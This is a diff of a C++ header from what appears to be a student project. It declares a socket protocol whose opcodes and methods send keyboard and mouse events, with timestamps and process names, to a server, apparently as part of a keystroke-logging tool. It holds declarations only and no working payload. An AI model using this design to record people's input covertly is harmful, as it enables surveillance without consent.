@@ -5,23 +5,104 @@
 // Login   <bertra_l@epitech.net>
 // 
 // Started on  Wed Oct 21 22:50:40 2015 Bertrand-Rapello Baptiste
-// Last update Thu Oct 22 09:49:33 2015 Antoine Plaskowski
+// Last update Fri Oct 23 11:08:23 2015 Antoine Plaskowski
 //
 
 #ifndef		PROTOCOLV1_HPP_
 # define	PROTOCOLV1_HPP_
 
 # include	<string>
+# include	<array>
+# include	<queue>
 # include	"IProtocol.hpp"
 # include	"ITime.hpp"
 
 class Protocolv1 : public IProtocol
 {
+private:
+  enum		Opcode : uint8_t
+  {
+    RESULT = 0,
+    MAC_ADDRESS = 1,
+    VERSION = 2,
+    CONNECT = 3,
+    DISCONNECT = 4,
+    SERVERCMD = 5,
+    CLIENTLOG = 6,
+    PING = 7,
+    PONG = 8,
+    KEYBOARD = 9,
+    MOUSE = 10
+  };
+  struct	Header
+  {
+    Opcode	opcode;
+    uint8_t	id;
+    uint16_t	size;
+  };
+  struct	Packet
+  {
+    union
+    {
+      struct
+      {
+	Header	header;
+	uint8_t	data[UINT16_MAX];
+      }		packet;
+      uint8_t	buffer[sizeof(packet)];
+    };
+    };
 public:
-  Protocolv1(void);
+  Protocolv1(ISocket *socket, ITime *time = nullptr);
   ~Protocolv1(void);
 private:
-
+  Protocolv1(Protocolv1 const &source);
+  Protocolv1	&operator=(Protocolv1 const &source);
+  bool	run(IDatabase *database = nullptr, ITime const *timeout = nullptr);
+  bool	set_socket(ISocket *socket);
+  bool	stop(void);
+  bool	start(void);
+  bool	mute(void);
+  bool	unmute(void);
+  std::string const	&get_mac_address(void) const;
+  bool	mac_address(std::string const &mac_address);
+  bool	log(std::string const &log);
+  bool	keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process);
+  bool	mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amout, std::string const &event, std::string const &button, std::string const &process);
+private:
+  bool	read_result(void);
+  bool	write_result(void);
+  bool	read_mac_address(void);
+  bool	write_mac_address(void);
+  bool	read_version(void);
+  bool	write_version(void);
+  bool	read_connect(void);
+  bool	write_connect(void);
+  bool	read_disconnect(void);
+  bool	write_disconnect(void);
+  bool	read_servercmd(void);
+  bool	write_servercmd(void);
+  bool	read_clientlog(void);
+  bool	write_clientlog(void);
+  bool	read_ping(void);
+  bool	write_ping(void);
+  bool	read_pong(void);
+  bool	write_pong(void);
+  bool	read_keyboard(void);
+  bool	write_keyboard(void);
+  bool	read_mouse(void);
+  bool	write_mouse(void);
+private:
+  ISocket	*m_socket;
+  ITime	*m_last_read;
+  std::string	m_mac_address;
+  std::array<Packet, 256>	m_packets;
+  std::queue<uintmax_t>	m_write;
+  Packet	m_buffer;
+  uintmax_t	m_read;
+  bool	m_is_connect;
+  bool	m_is_stop;
+  bool	m_is_mute;
 };
 
 #endif	/* !IPROTOCOLV1_HPP_ */
